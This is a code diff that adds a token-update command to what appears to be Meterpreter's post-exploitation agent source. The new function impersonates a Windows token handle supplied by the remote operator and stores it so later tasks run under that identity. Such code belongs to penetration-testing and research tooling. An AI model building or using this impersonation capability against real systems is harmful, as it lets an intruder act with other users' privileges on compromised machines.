@@ -275,6 +275,41 @@ DWORD request_sys_config_drop_token(Remote* pRemote, Packet* pPacket)
 }
 
 /*
+ * @brief Updates an existing thread token.
+ * @param pRemote Pointer to the \c Remote instance.
+ * @param pRequest Pointer to the \c Request packet.
+ * @returns Indication of success or failure.
+ */
+DWORD request_sys_config_update_token(Remote* pRemote, Packet* pPacket)
+{
+	Packet* pResponse = met_api->packet.create_response(pPacket);
+	DWORD dwResult = ERROR_SUCCESS;
+	HANDLE hToken = NULL;
+	HANDLE hDupToken = NULL;
+
+	// Get token handle from the client
+	hToken = (HANDLE)met_api->packet.get_tlv_value_qword(pPacket, TLV_TYPE_HANDLE);
+
+	// Impersonate token in the current thread
+	if (!ImpersonateLoggedOnUser(hToken))
+	{
+		dwResult = GetLastError();
+		dprintf("[UPDATE-TOKEN] Failed to impersonate token (%u)", dwResult);
+		met_api->packet.transmit_response(dwResult, pRemote, pResponse);
+		return dwResult;
+	}
+
+	// Store the token handle for future tasks
+	met_api->thread.update_token(pRemote, hToken);
+
+	// Transmit the response
+	met_api->packet.add_tlv_string(pResponse, TLV_TYPE_TOKEN_UPDATE_RESULT, "Token updated and impersonated succesfully.");
+	met_api->packet.transmit_response(dwResult, pRemote, pResponse);
+
+	return dwResult;
+}
+
+/*
  * sys_getprivs
  * ----------
  *
